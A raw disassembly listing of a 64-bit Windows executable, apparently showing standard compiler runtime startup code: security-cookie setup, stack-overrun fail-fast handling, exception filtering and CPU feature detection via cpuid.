   140003372:	48 83 ec 20          	sub    $0x20,%rsp
   140003376:	48 8b d9             	mov    %rcx,%rbx
   140003379:	33 c9                	xor    %ecx,%ecx
   14000337b:	ff 15 27 1d 00 00    	call   *0x1d27(%rip)        # 0x1400050a8
   140003381:	48 8b cb             	mov    %rbx,%rcx
   140003384:	ff 15 26 1d 00 00    	call   *0x1d26(%rip)        # 0x1400050b0
   14000338a:	ff 15 90 1d 00 00    	call   *0x1d90(%rip)        # 0x140005120
   140003390:	48 8b c8             	mov    %rax,%rcx
   140003393:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140003398:	48 83 c4 20          	add    $0x20,%rsp
   14000339c:	5b                   	pop    %rbx
   14000339d:	48 ff 25 74 1d 00 00 	rex.W jmp *0x1d74(%rip)        # 0x140005118
   1400033a4:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400033a9:	48 83 ec 38          	sub    $0x38,%rsp
   1400033ad:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400033b2:	ff 15 e0 1c 00 00    	call   *0x1ce0(%rip)        # 0x140005098
   1400033b8:	85 c0                	test   %eax,%eax
   1400033ba:	74 07                	je     0x1400033c3
   1400033bc:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400033c1:	cd 29                	int    $0x29
   1400033c3:	48 8d 0d b6 4e 00 00 	lea    0x4eb6(%rip),%rcx        # 0x140008280
   1400033ca:	e8 a9 00 00 00       	call   0x140003478
   1400033cf:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400033d4:	48 89 05 9d 4f 00 00 	mov    %rax,0x4f9d(%rip)        # 0x140008378
   1400033db:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400033e0:	48 83 c0 08          	add    $0x8,%rax
   1400033e4:	48 89 05 2d 4f 00 00 	mov    %rax,0x4f2d(%rip)        # 0x140008318
   1400033eb:	48 8b 05 86 4f 00 00 	mov    0x4f86(%rip),%rax        # 0x140008378
   1400033f2:	48 89 05 f7 4d 00 00 	mov    %rax,0x4df7(%rip)        # 0x1400081f0
   1400033f9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400033fe:	48 89 05 fb 4e 00 00 	mov    %rax,0x4efb(%rip)        # 0x140008300
   140003405:	c7 05 d1 4d 00 00 09 	movl   $0xc0000409,0x4dd1(%rip)        # 0x1400081e0
   14000340c:	04 00 c0 
   14000340f:	c7 05 cb 4d 00 00 01 	movl   $0x1,0x4dcb(%rip)        # 0x1400081e4
   140003416:	00 00 00 
   140003419:	c7 05 d5 4d 00 00 01 	movl   $0x1,0x4dd5(%rip)        # 0x1400081f8
   140003420:	00 00 00 
   140003423:	b8 08 00 00 00       	mov    $0x8,%eax
   140003428:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000342c:	48 8d 0d cd 4d 00 00 	lea    0x4dcd(%rip),%rcx        # 0x140008200
   140003433:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000343a:	00 
   14000343b:	b8 08 00 00 00       	mov    $0x8,%eax
   140003440:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140003444:	48 8b 0d f5 4b 00 00 	mov    0x4bf5(%rip),%rcx        # 0x140008040
   14000344b:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140003450:	b8 08 00 00 00       	mov    $0x8,%eax
   140003455:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140003459:	48 8b 0d 20 4c 00 00 	mov    0x4c20(%rip),%rcx        # 0x140008080
   140003460:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140003465:	48 8d 0d 44 20 00 00 	lea    0x2044(%rip),%rcx        # 0x1400054b0
   14000346c:	e8 ff fe ff ff       	call   0x140003370
   140003471:	90                   	nop
   140003472:	48 83 c4 38          	add    $0x38,%rsp
   140003476:	c3                   	ret
   140003477:	cc                   	int3
   140003478:	40 53                	rex push %rbx
   14000347a:	56                   	push   %rsi
   14000347b:	57                   	push   %rdi
   14000347c:	48 83 ec 40          	sub    $0x40,%rsp
   140003480:	48 8b d9             	mov    %rcx,%rbx
   140003483:	ff 15 3f 1c 00 00    	call   *0x1c3f(%rip)        # 0x1400050c8
   140003489:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140003490:	33 ff                	xor    %edi,%edi
   140003492:	45 33 c0             	xor    %r8d,%r8d
   140003495:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000349a:	48 8b ce             	mov    %rsi,%rcx
   14000349d:	ff 15 1d 1c 00 00    	call   *0x1c1d(%rip)        # 0x1400050c0
   1400034a3:	48 85 c0             	test   %rax,%rax
   1400034a6:	74 3c                	je     0x1400034e4
   1400034a8:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400034ad:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400034b2:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400034b9:	00 00 
   1400034bb:	4c 8b c8             	mov    %rax,%r9
   1400034be:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400034c3:	4c 8b c6             	mov    %rsi,%r8
   1400034c6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400034cb:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400034d0:	33 c9                	xor    %ecx,%ecx
   1400034d2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400034d7:	ff 15 23 1c 00 00    	call   *0x1c23(%rip)        # 0x140005100
   1400034dd:	ff c7                	inc    %edi
   1400034df:	83 ff 02             	cmp    $0x2,%edi
   1400034e2:	7c ae                	jl     0x140003492
   1400034e4:	48 83 c4 40          	add    $0x40,%rsp
   1400034e8:	5f                   	pop    %rdi
   1400034e9:	5e                   	pop    %rsi
   1400034ea:	5b                   	pop    %rbx
   1400034eb:	c3                   	ret
   1400034ec:	e9 89 07 00 00       	jmp    0x140003c7a
   1400034f1:	cc                   	int3
   1400034f2:	cc                   	int3
   1400034f3:	cc                   	int3
   1400034f4:	48 8d 05 f5 1f 00 00 	lea    0x1ff5(%rip),%rax        # 0x1400054f0
   1400034fb:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140003502:	00 
   140003503:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140003507:	48 8d 05 d2 1f 00 00 	lea    0x1fd2(%rip),%rax        # 0x1400054e0
   14000350e:	48 89 01             	mov    %rax,(%rcx)
   140003511:	48 8b c1             	mov    %rcx,%rax
   140003514:	c3                   	ret
   140003515:	cc                   	int3
   140003516:	cc                   	int3
   140003517:	cc                   	int3
   140003518:	48 83 ec 48          	sub    $0x48,%rsp
   14000351c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003521:	e8 ce ff ff ff       	call   0x1400034f4
   140003526:	48 8d 15 33 31 00 00 	lea    0x3133(%rip),%rdx        # 0x140006660
   14000352d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003532:	e8 25 07 00 00       	call   0x140003c5c
   140003537:	cc                   	int3
   140003538:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000353d:	55                   	push   %rbp
   14000353e:	48 8b ec             	mov    %rsp,%rbp
   140003541:	48 83 ec 30          	sub    $0x30,%rsp
   140003545:	48 8b 05 f4 4a 00 00 	mov    0x4af4(%rip),%rax        # 0x140008040
   14000354c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140003553:	2b 00 00 
   140003556:	48 3b c3             	cmp    %rbx,%rax
   140003559:	75 77                	jne    0x1400035d2
   14000355b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000355f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140003566:	00 
   140003567:	ff 15 13 1b 00 00    	call   *0x1b13(%rip)        # 0x140005080
   14000356d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003571:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003575:	ff 15 55 1b 00 00    	call   *0x1b55(%rip)        # 0x1400050d0
   14000357b:	8b c0                	mov    %eax,%eax
   14000357d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003581:	ff 15 01 1b 00 00    	call   *0x1b01(%rip)        # 0x140005088
   140003587:	8b c0                	mov    %eax,%eax
   140003589:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000358d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003591:	ff 15 f9 1a 00 00    	call   *0x1af9(%rip)        # 0x140005090
   140003597:	8b 45 18             	mov    0x18(%rbp),%eax
   14000359a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000359e:	48 c1 e0 20          	shl    $0x20,%rax
   1400035a2:	48 33 45 18          	xor    0x18(%rbp),%rax
   1400035a6:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   1400035aa:	48 33 c1             	xor    %rcx,%rax
   1400035ad:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1400035b4:	ff 00 00 
   1400035b7:	48 23 c1             	and    %rcx,%rax
   1400035ba:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1400035c1:	2b 00 00 
   1400035c4:	48 3b c3             	cmp    %rbx,%rax
   1400035c7:	48 0f 44 c1          	cmove  %rcx,%rax
   1400035cb:	48 89 05 6e 4a 00 00 	mov    %rax,0x4a6e(%rip)        # 0x140008040
   1400035d2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400035d7:	48 f7 d0             	not    %rax
   1400035da:	48 89 05 9f 4a 00 00 	mov    %rax,0x4a9f(%rip)        # 0x140008080
   1400035e1:	48 83 c4 30          	add    $0x30,%rsp
   1400035e5:	5d                   	pop    %rbp
   1400035e6:	c3                   	ret
   1400035e7:	cc                   	int3
   1400035e8:	33 c0                	xor    %eax,%eax
   1400035ea:	c3                   	ret
   1400035eb:	cc                   	int3
   1400035ec:	b8 01 00 00 00       	mov    $0x1,%eax
   1400035f1:	c3                   	ret
   1400035f2:	cc                   	int3
   1400035f3:	cc                   	int3
   1400035f4:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400035f9:	c3                   	ret
   1400035fa:	cc                   	int3
   1400035fb:	cc                   	int3
   1400035fc:	48 8d 0d 4d 51 00 00 	lea    0x514d(%rip),%rcx        # 0x140008750
   140003603:	48 ff 25 6e 1a 00 00 	rex.W jmp *0x1a6e(%rip)        # 0x140005078
   14000360a:	cc                   	int3
   14000360b:	cc                   	int3
   14000360c:	b0 01                	mov    $0x1,%al
   14000360e:	c3                   	ret
   14000360f:	cc                   	int3
   140003610:	48 8d 05 49 51 00 00 	lea    0x5149(%rip),%rax        # 0x140008760
   140003617:	c3                   	ret
   140003618:	48 83 ec 28          	sub    $0x28,%rsp
   14000361c:	e8 ef d9 ff ff       	call   0x140001010
   140003621:	48 83 08 24          	orq    $0x24,(%rax)
   140003625:	e8 e6 ff ff ff       	call   0x140003610
   14000362a:	48 83 08 02          	orq    $0x2,(%rax)
   14000362e:	48 83 c4 28          	add    $0x28,%rsp
   140003632:	c3                   	ret
   140003633:	cc                   	int3
   140003634:	33 c0                	xor    %eax,%eax
   140003636:	39 05 50 4a 00 00    	cmp    %eax,0x4a50(%rip)        # 0x14000808c
   14000363c:	0f 94 c0             	sete   %al
   14000363f:	c3                   	ret
   140003640:	48 8d 05 41 51 00 00 	lea    0x5141(%rip),%rax        # 0x140008788
   140003647:	c3                   	ret
   140003648:	48 8d 05 31 51 00 00 	lea    0x5131(%rip),%rax        # 0x140008780
   14000364f:	c3                   	ret
   140003650:	c7 05 0e 51 00 00 00 	movl   $0x0,0x510e(%rip)        # 0x140008768
   140003657:	00 00 00 
   14000365a:	c3                   	ret
   14000365b:	cc                   	int3
   14000365c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003661:	55                   	push   %rbp
   140003662:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140003669:	ff 
   14000366a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140003671:	8b d9                	mov    %ecx,%ebx
   140003673:	b9 17 00 00 00       	mov    $0x17,%ecx
   140003678:	ff 15 1a 1a 00 00    	call   *0x1a1a(%rip)        # 0x140005098
   14000367e:	85 c0                	test   %eax,%eax
   140003680:	74 04                	je     0x140003686
   140003682:	8b cb                	mov    %ebx,%ecx
   140003684:	cd 29                	int    $0x29
   140003686:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000368b:	e8 c0 ff ff ff       	call   0x140003650
   140003690:	33 d2                	xor    %edx,%edx
   140003692:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003696:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000369c:	e8 c1 05 00 00       	call   0x140003c62
   1400036a1:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400036a5:	ff 15 1d 1a 00 00    	call   *0x1a1d(%rip)        # 0x1400050c8
   1400036ab:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1400036b2:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1400036b9:	48 8b cb             	mov    %rbx,%rcx
   1400036bc:	45 33 c0             	xor    %r8d,%r8d
   1400036bf:	ff 15 fb 19 00 00    	call   *0x19fb(%rip)        # 0x1400050c0
   1400036c5:	48 85 c0             	test   %rax,%rax
   1400036c8:	74 3f                	je     0x140003709
   1400036ca:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400036d1:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400036d8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400036df:	00 00 
   1400036e1:	4c 8b c8             	mov    %rax,%r9
   1400036e4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400036e9:	4c 8b c3             	mov    %rbx,%r8
   1400036ec:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400036f3:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400036f8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400036fc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003701:	33 c9                	xor    %ecx,%ecx
   140003703:	ff 15 f7 19 00 00    	call   *0x19f7(%rip)        # 0x140005100
   140003709:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140003710:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003715:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000371c:	33 d2                	xor    %edx,%edx
   14000371e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140003725:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000372b:	48 83 c0 08          	add    $0x8,%rax
   14000372f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140003736:	e8 27 05 00 00       	call   0x140003c62
   14000373b:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140003742:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003747:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000374e:	40 
   14000374f:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140003756:	00 
   140003757:	ff 15 13 19 00 00    	call   *0x1913(%rip)        # 0x140005070
   14000375d:	8b d8                	mov    %eax,%ebx
   14000375f:	33 c9                	xor    %ecx,%ecx
   140003761:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003766:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000376b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000376f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003774:	ff 15 2e 19 00 00    	call   *0x192e(%rip)        # 0x1400050a8
   14000377a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000377f:	ff 15 2b 19 00 00    	call   *0x192b(%rip)        # 0x1400050b0
   140003785:	85 c0                	test   %eax,%eax
   140003787:	75 0d                	jne    0x140003796
   140003789:	83 fb 01             	cmp    $0x1,%ebx
   14000378c:	74 08                	je     0x140003796
   14000378e:	8d 48 03             	lea    0x3(%rax),%ecx
   140003791:	e8 ba fe ff ff       	call   0x140003650
   140003796:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000379d:	00 
   14000379e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1400037a5:	5d                   	pop    %rbp
   1400037a6:	c3                   	ret
   1400037a7:	cc                   	int3
   1400037a8:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   1400037af:	33 d2                	xor    %edx,%edx
   1400037b1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400037b6:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   1400037ba:	e8 a3 04 00 00       	call   0x140003c62
   1400037bf:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400037c4:	ff 15 9e 18 00 00    	call   *0x189e(%rip)        # 0x140005068
   1400037ca:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   1400037cf:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400037d4:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   1400037da:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400037e1:	c3                   	ret
   1400037e2:	cc                   	int3
   1400037e3:	cc                   	int3
   1400037e4:	e9 ff fd ff ff       	jmp    0x1400035e8
   1400037e9:	cc                   	int3
   1400037ea:	cc                   	int3
   1400037eb:	cc                   	int3
   1400037ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400037f0:	33 c9                	xor    %ecx,%ecx
   1400037f2:	ff 15 68 18 00 00    	call   *0x1868(%rip)        # 0x140005060
   1400037f8:	48 85 c0             	test   %rax,%rax
   1400037fb:	74 3a                	je     0x140003837
   1400037fd:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140003802:	66 39 08             	cmp    %cx,(%rax)
   140003805:	75 30                	jne    0x140003837
   140003807:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000380b:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140003812:	75 23                	jne    0x140003837
   140003814:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140003819:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   14000381e:	75 17                	jne    0x140003837
   140003820:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140003827:	0e 
   140003828:	76 0d                	jbe    0x140003837
   14000382a:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140003831:	00 
   140003832:	0f 95 c0             	setne  %al
   140003835:	eb 02                	jmp    0x140003839
   140003837:	32 c0                	xor    %al,%al
   140003839:	48 83 c4 28          	add    $0x28,%rsp
   14000383d:	c3                   	ret
   14000383e:	cc                   	int3
   14000383f:	cc                   	int3
   140003840:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140003850
   140003847:	48 ff 25 5a 18 00 00 	rex.W jmp *0x185a(%rip)        # 0x1400050a8
   14000384e:	cc                   	int3
   14000384f:	cc                   	int3
   140003850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003855:	57                   	push   %rdi
   140003856:	48 83 ec 20          	sub    $0x20,%rsp
   14000385a:	48 8b 19             	mov    (%rcx),%rbx
   14000385d:	48 8b f9             	mov    %rcx,%rdi
   140003860:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140003866:	75 24                	jne    0x14000388c
   140003868:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000386c:	75 1e                	jne    0x14000388c
   14000386e:	8b 53 20             	mov    0x20(%rbx),%edx
   140003871:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   140003877:	74 20                	je     0x140003899
   140003879:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   14000387f:	83 f8 01             	cmp    $0x1,%eax
   140003882:	76 15                	jbe    0x140003899
   140003884:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   14000388a:	74 0d                	je     0x140003899
   14000388c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003891:	33 c0                	xor    %eax,%eax
   140003893:	48 83 c4 20          	add    $0x20,%rsp
   140003897:	5f                   	pop    %rdi
   140003898:	c3                   	ret
   140003899:	e8 ca 03 00 00       	call   0x140003c68
   14000389e:	48 89 18             	mov    %rbx,(%rax)
   1400038a1:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   1400038a5:	e8 c4 03 00 00       	call   0x140003c6e
   1400038aa:	48 89 18             	mov    %rbx,(%rax)
   1400038ad:	e8 da 03 00 00       	call   0x140003c8c
   1400038b2:	cc                   	int3
   1400038b3:	cc                   	int3
   1400038b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b9:	57                   	push   %rdi
   1400038ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400038be:	48 8d 1d cb 28 00 00 	lea    0x28cb(%rip),%rbx        # 0x140006190
   1400038c5:	48 8d 3d c4 28 00 00 	lea    0x28c4(%rip),%rdi        # 0x140006190
   1400038cc:	eb 12                	jmp    0x1400038e0
   1400038ce:	48 8b 03             	mov    (%rbx),%rax
   1400038d1:	48 85 c0             	test   %rax,%rax
   1400038d4:	74 06                	je     0x1400038dc
   1400038d6:	ff 15 e4 1a 00 00    	call   *0x1ae4(%rip)        # 0x1400053c0
   1400038dc:	48 83 c3 08          	add    $0x8,%rbx
   1400038e0:	48 3b df             	cmp    %rdi,%rbx
   1400038e3:	72 e9                	jb     0x1400038ce
   1400038e5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400038ea:	48 83 c4 20          	add    $0x20,%rsp
   1400038ee:	5f                   	pop    %rdi
   1400038ef:	c3                   	ret
   1400038f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038f5:	57                   	push   %rdi
   1400038f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400038fa:	48 8d 1d 9f 28 00 00 	lea    0x289f(%rip),%rbx        # 0x1400061a0
   140003901:	48 8d 3d 98 28 00 00 	lea    0x2898(%rip),%rdi        # 0x1400061a0
   140003908:	eb 12                	jmp    0x14000391c
   14000390a:	48 8b 03             	mov    (%rbx),%rax
   14000390d:	48 85 c0             	test   %rax,%rax
   140003910:	74 06                	je     0x140003918
   140003912:	ff 15 a8 1a 00 00    	call   *0x1aa8(%rip)        # 0x1400053c0
   140003918:	48 83 c3 08          	add    $0x8,%rbx
   14000391c:	48 3b df             	cmp    %rdi,%rbx
   14000391f:	72 e9                	jb     0x14000390a
   140003921:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003926:	48 83 c4 20          	add    $0x20,%rsp
   14000392a:	5f                   	pop    %rdi
   14000392b:	c3                   	ret
   14000392c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003931:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003936:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000393b:	57                   	push   %rdi
   14000393c:	48 83 ec 10          	sub    $0x10,%rsp
   140003940:	33 c0                	xor    %eax,%eax
   140003942:	33 c9                	xor    %ecx,%ecx
   140003944:	0f a2                	cpuid
   140003946:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   14000394c:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140003952:	0b d1                	or     %ecx,%edx
   140003954:	8b e8                	mov    %eax,%ebp
   140003956:	b8 01 00 00 00       	mov    $0x1,%eax
   14000395b:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140003961:	0b d3                	or     %ebx,%edx
   140003963:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003966:	0f a2                	cpuid
   140003968:	8b f9                	mov    %ecx,%edi
   14000396a:	75 5e                	jne    0x1400039ca
   14000396c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140003971:	48 c7 05 24 47 00 00 	movq   $0x8000,0x4724(%rip)        # 0x1400080a0
   140003978:	00 80 00 00 
   14000397c:	48 c7 05 21 47 00 00 	movq   $0xffffffffffffffff,0x4721(%rip)        # 0x1400080a8
   140003983:	ff ff ff ff 
   140003987:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000398c:	74 28                	je     0x1400039b6
   14000398e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140003993:	74 21                	je     0x1400039b6
   140003995:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000399a:	74 1a                	je     0x1400039b6
   14000399c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1400039a1:	83 f8 20             	cmp    $0x20,%eax
   1400039a4:	77 24                	ja     0x1400039ca
   1400039a6:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   1400039ad:	00 00 00 
   1400039b0:	48 0f a3 c1          	bt     %rax,%rcx
   1400039b4:	73 14                	jae    0x1400039ca
   1400039b6:	44 8b 05 b3 4d 00 00 	mov    0x4db3(%rip),%r8d        # 0x140008770
   1400039bd:	41 83 c8 01          	or     $0x1,%r8d
   1400039c1:	44 89 05 a8 4d 00 00 	mov    %r8d,0x4da8(%rip)        # 0x140008770
   1400039c8:	eb 07                	jmp    0x1400039d1
   1400039ca:	44 8b 05 9f 4d 00 00 	mov    0x4d9f(%rip),%r8d        # 0x140008770
   1400039d1:	45 33 c9             	xor    %r9d,%r9d
   1400039d4:	41 8b f1             	mov    %r9d,%esi
   1400039d7:	45 8b d1             	mov    %r9d,%r10d
   1400039da:	45 8b d9             	mov    %r9d,%r11d
   1400039dd:	83 fd 07             	cmp    $0x7,%ebp
   1400039e0:	7c 40                	jl     0x140003a22
   1400039e2:	41 8d 41 07          	lea    0x7(%r9),%eax
   1400039e6:	33 c9                	xor    %ecx,%ecx
   1400039e8:	0f a2                	cpuid
   1400039ea:	8b f2                	mov    %edx,%esi
   1400039ec:	44 8b cb             	mov    %ebx,%r9d
   1400039ef:	0f ba e3 09          	bt     $0x9,%ebx
   1400039f3:	73 0b                	jae    0x140003a00
   1400039f5:	41 83 c8 02          	or     $0x2,%r8d
   1400039f9:	44 89 05 70 4d 00 00 	mov    %r8d,0x4d70(%rip)        # 0x140008770
   140003a00:	83 f8 01             	cmp    $0x1,%eax
   140003a03:	7c 0d                	jl     0x140003a12
   140003a05:	b8 07 00 00 00       	mov    $0x7,%eax
   140003a0a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140003a0d:	0f a2                	cpuid
   140003a0f:	44 8b d2             	mov    %edx,%r10d
   140003a12:	b8 24 00 00 00       	mov    $0x24,%eax
   140003a17:	3b e8                	cmp    %eax,%ebp
   140003a19:	7c 07                	jl     0x140003a22
   140003a1b:	33 c9                	xor    %ecx,%ecx
   140003a1d:	0f a2                	cpuid
   140003a1f:	44 8b db             	mov    %ebx,%r11d
   140003a22:	48 8b 05 67 46 00 00 	mov    0x4667(%rip),%rax        # 0x140008090
   140003a29:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140003a2d:	c7 05 61 46 00 00 01 	movl   $0x1,0x4661(%rip)        # 0x140008098
   140003a34:	00 00 00 
   140003a37:	c7 05 5b 46 00 00 02 	movl   $0x2,0x465b(%rip)        # 0x14000809c
   140003a3e:	00 00 00 
   140003a41:	48 89 05 48 46 00 00 	mov    %rax,0x4648(%rip)        # 0x140008090
   140003a48:	0f ba e7 14          	bt     $0x14,%edi
   140003a4c:	73 1f                	jae    0x140003a6d
   140003a4e:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140003a52:	c7 05 3c 46 00 00 02 	movl   $0x2,0x463c(%rip)        # 0x140008098
   140003a59:	00 00 00 
   140003a5c:	48 89 05 2d 46 00 00 	mov    %rax,0x462d(%rip)        # 0x140008090
   140003a63:	c7 05 2f 46 00 00 06 	movl   $0x6,0x462f(%rip)        # 0x14000809c
   140003a6a:	00 00 00 
   140003a6d:	0f ba e7 1b          	bt     $0x1b,%edi
   140003a71:	0f 83 33 01 00 00    	jae    0x140003baa
   140003a77:	33 c9                	xor    %ecx,%ecx
   140003a79:	0f 01 d0             	xgetbv
   140003a7c:	48 c1 e2 20          	shl    $0x20,%rdx
   140003a80:	48 0b d0             	or     %rax,%rdx
   140003a83:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003a88:	0f ba e7 1c          	bt     $0x1c,%edi
   140003a8c:	0f 83 fc 00 00 00    	jae    0x140003b8e
   140003a92:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003a97:	24 06                	and    $0x6,%al
   140003a99:	3c 06                	cmp    $0x6,%al
   140003a9b:	0f 85 ed 00 00 00    	jne    0x140003b8e
   140003aa1:	8b 05 f5 45 00 00    	mov    0x45f5(%rip),%eax        # 0x14000809c
   140003aa7:	b2 e0                	mov    $0xe0,%dl
   140003aa9:	83 c8 08             	or     $0x8,%eax
   140003aac:	c7 05 e2 45 00 00 03 	movl   $0x3,0x45e2(%rip)        # 0x140008098
   140003ab3:	00 00 00 
   140003ab6:	89 05 e0 45 00 00    	mov    %eax,0x45e0(%rip)        # 0x14000809c
   140003abc:	41 f6 c1 20          	test   $0x20,%r9b
   140003ac0:	74 62                	je     0x140003b24
   140003ac2:	83 c8 20             	or     $0x20,%eax
   140003ac5:	c7 05 c9 45 00 00 05 	movl   $0x5,0x45c9(%rip)        # 0x140008098
   140003acc:	00 00 00 
   140003acf:	89 05 c7 45 00 00    	mov    %eax,0x45c7(%rip)        # 0x14000809c
